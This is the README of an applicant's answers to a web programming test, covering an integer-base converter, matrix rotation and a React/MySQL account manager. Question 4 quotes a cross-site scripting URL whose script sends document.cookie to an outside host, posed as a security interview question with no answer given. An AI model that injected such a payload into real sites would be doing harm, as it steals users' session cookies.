# Epic Games Programming Exercise taken by Jason R Alexander

This README describes Jason R Alexander's Epic Game Web Coding Test. Answer to your questions, my assumptions on your coding problems,
units test locations and other details are list below.

Contact : sunnysidesounds@gmail.com / 415-690-3590

## Questions 1: Implementation of _integerToString(value, numberBase)_

* Assumptions:
    * Assuming only whole numbers, e.g integers for input value and number base integers (1, 3, 5...)

* Completion Time:
    * 20 minutes app setup, test setup, familiarize myself
    * 1 hours to solve, test, refactor, revise

* Tests:
    * Run tests by `yarn react-scripts test`
    * Location: `src/questions1/Integer.test.js` (unit tests)

## Question 2: Implementation of _clockwiseMatrix(matrixString)_

* Assumptions:
    * Assuming the string representation is patterned after matrix, SIZE: N * M ( e.g [1, 2, 3...] [4, 5, 6...] )
        * With that said, this matrix should be able to be parsed with a JSON parser, (after cleaning and formatting the initial string.)
        * We always have equal opening and closing brackets. If not a `An error has occurred` message is outputted.
    * The sample test input #5 [7, 8 , 9], returns a blank (empty) string per the exercise document in the sample output.
        * So anything less than 3 elements returns an empty string. If I removed this constraint it would return [7, 8 , 9]

* Completion Time:
    * 2.5 hrs, initially solved, refactored, tests, revise

* Tests:
    * Run tests by `yarn react-scripts test`
    * Location: `src/questions2/MatrixRotator.test.js` (unit tests)

* Logging:
    * In the MatrixRotator.js line 36 we are console logging this error. A TODO, would to implement some kind of logging library, monitoring, on this error.
        * Maybe client-to-server logging mechanism / library

* Question 2a:
    * Question: Given your solution, how would you verify the correctness of your answers?
    * Answer : I've verified my solutions by doing the following testting
        * Initial tests with the provided input/output test data
        * Tests for the string cleaning and formatting.
        * Matrix string to 2d-array formatting
        * Matrix generation


## Question 3: Simple Account Mangement Service

* Minimum Requirements:
    * Must have user list view
    * Must have user new form
    * Must be able to create, read, update and delete

* Enchanced Feature Requirements:
    * ***Improved User Experience and front-end design***. Created modals for new, update and delete.
        * As I wasn’t familiar with using the ReactJS framework. The original design had 2 columns. Left column facilitated the list-all accounts,
        while the right columns showed the different forms (e.g New, Edit, Delete forms) After becoming acclimated to the framework I created a
        single list view that displays all the user accounts and several modal pop-up dialogs that facilitated the different CRUD-like operations.
        I also styled the look to reflect some of Epic’s color schema (Black and white)
    * ***Full service implementation***, in-memory is replaced with Mysql Database, if environment variable USE_MYSQL_DB is set to true.
        * Setup on mysql database:
            1. Set environment variables: `../src/question3/scripts/setup_mysql.sh`
            2. Import the schema and data: `mysql -u root -p account_manager < /src/question2/sql/schema_test_data_setup.sql`
                * TODO: To setup migration functionality with Knexjs, this would remove step 2
    * ***Add searching/filtering functionality to the accounts***, the list view have filter by methods for name, email, birthday and balance

* Assumptions:
    * name and email are required, birthday is not, balance does not?

* Completion Time:
    * 4 hrs to setup endpoint call, display users in list view and stubbed new, edit and delete onClick events.
    * 3 hours to add enchanged features. Full service implementation, filtering and UI design improvements.

* Tests:
    * Run tests by `yarn react-scripts test`
    * Location: `src/questions3/Accounts/Accounts.test.js` (integration endpoint tests)
    * Location: `src/questions3/Common/Compare.test.js` (unit tests)

* Screenshots:

***LIST VIEW***

<img width="1142" alt="Screen Shot 2020-10-12 at 9 34 32 PM" src="https://user-images.githubusercontent.com/1030838/95816054-049d9100-0cd3-11eb-918e-3f045cef0eaa.png">

***EDIT / NEW MODEL VIEW***

<img width="776" alt="Screen Shot 2020-10-12 at 9 34 41 PM" src="https://user-images.githubusercontent.com/1030838/95816139-37478980-0cd3-11eb-8ae4-cc8285f85146.png">


## Question 4:
* Question: What harm could result from the following? `http://www.example.com/search?q=<script>object.src="http://otherexample.com/code?data="+document.cookie</script>`
* Answer:

## Question 5:
* Question: Explain what security measures need to be taken into consideration for web applications.
* Answer:

## Question 6:
* Question: Please provide us with a link(s) to your portfolio and/or some code samples of your work.
* Answer:



## Things I had to change due to errors: (TEMP)


* Package.json updates:

- Update to "node-sass": "^4.14.1", because I was using node v14.13.0 ( was v14.11.0
- Had to add "fsevents": "^2.1.3", because `yarn react-scripts test` wouldn't run



* Fixed errors I came across doing question 1:


[Error: Invariant failed: You should not use <Switch> outside a <Router>]

/*
 * Warning: Failed prop type: You provided a value prop to a form
 * field without an onChange handler. This will render a read-only
 * field. If the field should be mutable use defaultValue.
 * Otherwise, set either onChange or readOnly.
 *  */



 ### Questions
 - What are using using bind function or arrow functions?
 - Write a script about environment variables.